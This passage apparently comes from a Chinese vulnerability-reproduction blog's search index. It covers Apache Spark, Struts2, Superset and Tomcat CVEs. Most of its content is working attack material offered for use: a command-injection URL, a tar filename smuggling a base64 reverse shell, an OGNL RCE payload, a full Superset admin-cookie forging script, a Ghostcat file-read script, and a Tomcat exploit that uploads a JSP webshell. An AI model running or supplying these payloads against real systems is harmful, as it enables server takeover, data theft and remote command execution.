","date":"0001-01-01","objectID":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/:3:0","tags":null,"title":"","uri":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /jobs/?doAs=`touch /tmp/test.txt` ","date":"0001-01-01","objectID":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/:4:0","tags":null,"title":"","uri":"/apache-spark-doas-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-33891/"},{"categories":null,"content":"Apache Spark unTarUsingTar 命令注入漏洞 SPARK-38631 ","date":"0001-01-01","objectID":"/apache-spark-untarusingtar-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-spark-38631/:0:0","tags":null,"title":"","uri":"/apache-spark-untarusingtar-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-spark-38631/"},{"categories":null,"content":"漏洞描述 Apache Spark 是一种用于大数据工作负载的分布式开源处理系统。它使用内存中缓存和优化的查询执行方式，可针对任何规模的数据进行快速分析查询。它提供使用Java、Scala、Python 和 R 语言的开发 API，支持跨多个工作负载重用代码—批处理、交互式查询、实时分析、机器学习和图形处理等。当Spark任务的文件名可控时，Utils.unpack采用命令拼接的形式对tar文件进行解压，存在任意命令注入的风险。这是源于Hadoop中unTar函数存在问题，在其执行shell命令之前未正确转义文件名，直接拼接命令导致任意命令注入。 ","date":"0001-01-01","objectID":"/apache-spark-untarusingtar-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-spark-38631/:1:0","tags":null,"title":"","uri":"/apache-spark-untarusingtar-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-spark-38631/"},{"categories":null,"content":"漏洞影响 Apache Spark 3.1.2, 3.2.1, 3.3.0 ","date":"0001-01-01","objectID":"/apache-spark-untarusingtar-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-spark-38631/:2:0","tags":null,"title":"","uri":"/apache-spark-untarusingtar-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-spark-38631/"},{"categories":null,"content":"漏洞复现 查看官方的修复补丁 官方修复针对.tar后缀的压缩包调用了新增的unTarUsingJava函数来进行处理，我们下载存在漏洞的版本看一下漏洞位置 hadoop-common-2.7.4.jar!/org/apache/hadoop/fs/FileUtil.class 可以看到漏洞主要出现在 Linux对文件的解压处理中 public static void unTar(File inFile, File untarDir) throws IOException { if (!untarDir.mkdirs() \u0026\u0026 !untarDir.isDirectory()) { throw new IOException(\"Mkdirs failed to create \" + untarDir); } else { boolean gzipped = inFile.toString().endsWith(\"gz\"); if (Shell.WINDOWS) { unTarUsingJava(inFile, untarDir, gzipped); } else { unTarUsingTar(inFile, untarDir, gzipped); } } } 这里我们控制压缩tar文件的文件名就可以进行命令注入 private static void unTarUsingTar(File inFile, File untarDir, boolean gzipped) throws IOException { StringBuffer untarCommand = new StringBuffer(); if (gzipped) { untarCommand.append(\" gzip -dc '\"); untarCommand.append(makeShellPath(inFile)); untarCommand.append(\"' | (\"); } untarCommand.append(\"cd '\"); untarCommand.append(makeShellPath(untarDir)); untarCommand.append(\"' ; \"); untarCommand.append(\"tar -xf \"); if (gzipped) { untarCommand.append(\" -)\"); } else { untarCommand.append(makeShellPath(inFile)); } String[] shellCmd = new String[]{\"bash\", \"-c\", untarCommand.toString()}; ShellCommandExecutor shexec = new ShellCommandExecutor(shellCmd); shexec.execute(); int exitcode = shexec.getExitCode(); if (exitcode != 0) { throw new IOException(\"Error untarring file \" + inFile + \". Tar process exited with exit code \" + exitcode); } } 创建Tar文件, 在使用 addArchive执行解压就可以注入恶意命令 touch '1\\|{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}\\|1.tar' ","date":"0001-01-01","objectID":"/apache-spark-untarusingtar-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-spark-38631/:3:0","tags":null,"title":"","uri":"/apache-spark-untarusingtar-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-spark-38631/"},{"categories":null,"content":"Apache Struts2 S2-062 远程代码执行漏洞 CVE-2021-31805 ","date":"0001-01-01","objectID":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/:0:0","tags":null,"title":"","uri":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/"},{"categories":null,"content":"漏洞描述 该漏洞由于对CVE-2020-17530的修复不完整造成的，CVE-2020-17530漏洞是由于Struts2 会对某些标签属性(比如id) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 其中x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。在CVE-2021-31805漏洞中，仍然存在部分标签属性会造成攻击者恶意构造的OGNL表达式执行，导致远程代码执行。 ","date":"0001-01-01","objectID":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/:1:0","tags":null,"title":"","uri":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/"},{"categories":null,"content":"漏洞影响 Struts 2.0.0 - Struts 2.5.29 ","date":"0001-01-01","objectID":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/:2:0","tags":null,"title":"","uri":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/"},{"categories":null,"content":"环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/struts2/s2-061 docker-compose up -d ","date":"0001-01-01","objectID":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/:3:0","tags":null,"title":"","uri":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/"},{"categories":null,"content":"漏洞复现 主页面 发送请求包 POST /index.action HTTP/1.1 Host: localhost:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 829 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\"id\" %{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"id\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- ","date":"0001-01-01","objectID":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/:4:0","tags":null,"title":"","uri":"/apache-struts2-s2-062-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-31805/"},{"categories":null,"content":"Apache Superset SECRET_KEY 未授权访问漏洞 CVE-2023-27524 ","date":"0001-01-01","objectID":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/:0:0","tags":null,"title":"","uri":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/"},{"categories":null,"content":"漏洞描述 Apache Superset 是一款现代化的开源大数据工具，也是企业级商业智能 Web 应用，用于数据探索分析和数据可视化。它提供了简单易用的无代码可视化构建器和声称是最先进的 SQL 编辑器，用户可以使用这些工具快速地构建数据仪表盘。CVE-2023-27524 中，未经授权的攻击者可根据默认配置的SECRET_KEY伪造成管理员用户访问Apache Superset。 ","date":"0001-01-01","objectID":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/:1:0","tags":null,"title":"","uri":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/"},{"categories":null,"content":"漏洞影响 Apache Superse \u003c= 2.0.1 ","date":"0001-01-01","objectID":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/:2:0","tags":null,"title":"","uri":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/"},{"categories":null,"content":"QUAKE app.name=\"Apache Superset\" ","date":"0001-01-01","objectID":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/:3:0","tags":null,"title":"","uri":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/"},{"categories":null,"content":"漏洞复现 登陆页面 漏洞修复补丁 https://github.com/apache/superset/pull/23186/files 补丁代码中，新建了判断用户是否使用了默认的Key进行配置，如果为默认的Key，就直接中断启动,。但在 Docker的 env 下还是添加了固定的 Key: TEST_NON_DEV_SECRET # https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py SECRET_KEYS = [ b'\\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h', # version \u003c 1.4.1 b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET', # version \u003e= 1.4.1 b'thisISaSECRET_1234', # deployment template b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY', # documentation b'TEST_NON_DEV_SECRET' # docker compose ] 以Docker下的环境举例 初次请求时会获取到 Cookie, 使用默认Key验证 Cookie是否可被伪造 登陆主页面观察主要参数 通过设置参数 user_id 和 _user_id 为 1 ,构造加密Cookie \u003e\u003e\u003e from flask_unsign import session \u003e\u003e\u003e session.sign({'_user_id': 1, 'user_id': 1},'TEST_NON_DEV_SECRET') 'eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZE51uw.EdD7zSzojgY4keqZLOKR4GndJf8' 利用构造的 Cookie就可以获取到 Web后台管理权限, 后台中存在数据库语句执行模块，通过设置允许执行其他数据库语句后利用数据库语句 RCE ","date":"0001-01-01","objectID":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/:4:0","tags":null,"title":"","uri":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/"},{"categories":null,"content":"漏洞POC from flask_unsign import session import requests import urllib3 import argparse import re from time import sleep urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) SECRET_KEYS = [ b'\\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h', # version \u003c 1.4.1 b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET', # version \u003e= 1.4.1 b'thisISaSECRET_1234', # deployment template b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY', # documentation b'TEST_NON_DEV_SECRET' # docker compose ] def main(): parser = argparse.ArgumentParser() parser.add_argument('--url', '-u', help='Base URL of Superset instance', required=True) parser.add_argument('--id', help='User ID to forge session cookie for, default=1', required=False, default='1') parser.add_argument('--validate', '-v', help='Validate login', required=False, action='store_true') parser.add_argument('--timeout', '-t', help='Time to wait before using forged session cookie, default=5s', required=False, type=int, default=5) args = parser.parse_args() try: u = args.url.rstrip('/') + '/login/' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0' } resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False) if resp.status_code != 200: print(f'Error retrieving login page at {u}, status code: {resp.status_code}') return session_cookie = None for c in resp.cookies: if c.name == 'session': session_cookie = c.value break if not session_cookie: print('Error: No session cookie found') return print(f'Got session cookie: {session_cookie}') try: decoded = session.decode(session_cookie) print(f'Decoded session cookie: {decoded}') except: print('Error: Not a Flask session cookie') return match = re.search(r'\u0026#34;version_string\u0026#34;: \u0026#34;(.*?)\u0026#34', resp.text) if match: version = match.group(1) else: version = 'Unknown' print(f'Superset Version: {version}') for i, k in enumerate(SECRET_KEYS): cracked = session.verify(session_cookie, k) if cracked: break if not cracked: print('Failed to crack session cookie') return print(f'Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: {k}') try: user_id = int(args.id) except: user_id = args.id forged_cookie = session.sign({'_user_id': user_id, 'user_id': user_id}, k) print(f'Forged session cookie for user {user_id}: {forged_cookie}') if args.validate: try: headers['Cookie'] = f'session={forged_cookie}' print(f'Sleeping {args.timeout} seconds before using forged cookie to account for time drift...') sleep(args.timeout) resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False) if resp.status_code == 302: print(f'Got 302 on login, forged cookie appears to have been accepted') validated = True else: print(f'Got status code {resp.status_code} on login instead of expected redirect 302. Forged cookie does not appear to be valid. Re-check user id.') except Exception as e_inner: print(f'Got error {e_inner} on login instead of expected redirect 302. Forged cookie does not appear to be valid. Re-check user id.') if not validated: return print('Enumerating databases') for i in range(1, 101): database_url_base = args.url.rstrip('/') + '/api/v1/database' try: r = requests.get(f'{database_url_base}/{i}', headers=headers, verify=False, timeout=30, allow_redirects=False) if r.status_code == 200: result = r.json()['result'] # validate response is JSON name = result['database_name'] print(f'Found database {name}') elif r.status_code == 404: print(f'Done enumerating databases') break # no more databases else: print(f'Unexpected error: status code={r.status_code}') break except Exception as e_inner: print(f'Unexpected error: {e_inner}') break except Exception as e: print(f'Unexpected error: {e}') if __name__ == '__main__': main() ","date":"0001-01-01","objectID":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/:5:0","tags":null,"title":"","uri":"/apache-superset-secret_key-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-27524/"},{"categories":null,"content":"Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938 ","date":"0001-01-01","objectID":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/:0:0","tags":null,"title":"","uri":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/"},{"categories":null,"content":"漏洞描述 Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 ","date":"0001-01-01","objectID":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/:1:0","tags":null,"title":"","uri":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/"},{"categories":null,"content":"漏洞影响 Apache Tomcat 6 Apache Tomcat 7 \u003c 7.0.100 Apache Tomcat 8 \u003c 8.5.51 Apache Tomcat 9 \u003c 9.0.31 ","date":"0001-01-01","objectID":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/:2:0","tags":null,"title":"","uri":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080/ 正常即可 ","date":"0001-01-01","objectID":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/:3:0","tags":null,"title":"","uri":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/"},{"categories":null,"content":"漏洞复现 目前有可靠的利用脚本 Gihub工具下载链接 python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx 脚本需要使用python2来运行，此漏洞用于上传路径可控，开放8009端口AJP协议情况下通过读取文件执行命令 \u003c%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"whoami\").getInputStream())).readLine());%\u003e ","date":"0001-01-01","objectID":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/:4:0","tags":null,"title":"","uri":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/"},{"categories":null,"content":"漏洞POC https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\"\u003eh\", -1) l = len(s) return struct.pack(\"\u003eH%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \"\u003eh\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\"\u003ebbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\"\u003eH\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\"\u003ebbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\"\u003ebbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\"\u003eh\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_u","date":"0001-01-01","objectID":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/:5:0","tags":null,"title":"","uri":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/"},{"categories":null,"content":"参考文章 Github地址 威胁通告 APACHE TOMCAT 文件包含漏洞（CVE-2020-1938） ","date":"0001-01-01","objectID":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/:6:0","tags":null,"title":"","uri":"/apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-cve-2020-1938/"},{"categories":null,"content":"Apache Tomcat RCE via JSP Upload Bypass CVE-2017-12617 ","date":"0001-01-01","objectID":"/apache-tomcat-rce-via-jsp-upload-bypass/:0:0","tags":null,"title":"","uri":"/apache-tomcat-rce-via-jsp-upload-bypass/"},{"categories":null,"content":"漏洞描述 Apache Tomcat版本9.0.0.M1至9.0.0、8.5.0至8.5.22、8.0.0.RC1至8.0.46和7.0.0至7.0.81且启用HTTP PUT时（例如，通过设置只读如果将Default servlet的初始化参数设置为false，则可以通过特制请求将JSP文件上载到服务器。然后可以请求此JSP，并且服务器将执行其中包含的所有代码。 ","date":"0001-01-01","objectID":"/apache-tomcat-rce-via-jsp-upload-bypass/:1:0","tags":null,"title":"","uri":"/apache-tomcat-rce-via-jsp-upload-bypass/"},{"categories":null,"content":"漏洞影响 Apache Tomcat版本9.0.0.M1至9.0.0 Apache Tomcat版本8.5.0至8.5.22 Apache Tomcat版本8.0.0.RC1至8.0.46 Apache Tomcat版本7.0.0至7.0.81 ","date":"0001-01-01","objectID":"/apache-tomcat-rce-via-jsp-upload-bypass/:2:0","tags":null,"title":"","uri":"/apache-tomcat-rce-via-jsp-upload-bypass/"},{"categories":null,"content":"漏洞EXP #!/usr/bin/python # From https://github.com/cyberheartmi9/CVE-2017-12617/blob/master/tomcat-cve-2017-12617.py \"\"\" ./cve-2017-12617.py [options] options: -u ,--url [::] check target url if it's vulnerable -p,--pwn [::] generate webshell and upload it -l,--list [::] hosts list [+]usage: ./cve-2017-12617.py -u http://127.0.0.1 ./cve-2017-12617.py --url http://127.0.0.1 ./cve-2017-12617.py -u http://127.0.0.1 -p pwn ./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn ./cve-2017-12617.py -l hotsts.txt ./cve-2017-12617.py --list hosts.txt \"\"\" from __future__ import print_function from builtins import input from builtins import str from builtins import object import requests import re import signal from optparse import OptionParser class bcolors(object): HEADER = '\\033[95m' OKBLUE = '\\033[94m' OKGREEN = '\\033[92m' WARNING = '\\033[93m' FAIL = '\\033[91m' ENDC = '\\033[0m' BOLD = '\\033[1m' UNDERLINE = '\\033[4m' banner=\"\"\" _______ ________ ___ ___ __ ______ __ ___ __ __ ______ / ____\\ \\ / / ____| |__ \\ / _ \\/_ |____ | /_ |__ \\ / //_ |____ | | | \\ \\ / /| |__ ______ ) | | | || | / /_____| | ) / /_ | | / / | | \\ \\/ / | __|______/ /| | | || | / /______| | / / '_ \\| | / / | |____ \\ / | |____ / /_| |_| || | / / | |/ /| (_) | | / / \\_____| \\/ |______| |____|\\___/ |_|/_/ |_|____\\___/|_|/_/ [@intx0x80] \"\"\" def signal_handler(signal, frame): print (\"\\033[91m\"+\"\\n[-] Exiting\"+\"\\033[0m\") exit() signal.signal(signal.SIGINT, signal_handler) def removetags(tags): remove = re.compile('\u003c.*?\u003e') txt = re.sub(remove, '\\n', tags) return txt.replace(\"\\n\\n\\n\",\"\\n\") def getContent(url,f): headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} re=requests.get(str(url)+\"/\"+str(f), headers=headers) return re.content def createPayload(url,f): evil='\u003c% out.println(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");%\u003e' headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} req=requests.put(str(url)+str(f)+\"/\",data=evil, headers=headers) if req.status_code==201: print(\"File Created ..\") def RCE(url,f): EVIL=\"\"\"\u003cFORM METHOD=GET ACTION='{}'\u003e\"\"\".format(f)+\"\"\" \u003cINPUT name='cmd' type=text\u003e \u003cINPUT type=submit value='Run'\u003e \u003c/FORM\u003e \u003c%@ page import=\"java.io.*\" %\u003e \u003c% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\"\u003c/br\u003e\"; } } catch(IOException e) { e.printStackTrace(); } } %\u003e \u003cpre\u003e\u003c%=output %\u003e\u003c/pre\u003e\"\"\" headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} req=requests.put(str(url)+f+\"/\",data=EVIL, headers=headers) def shell(url,f): while True: headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 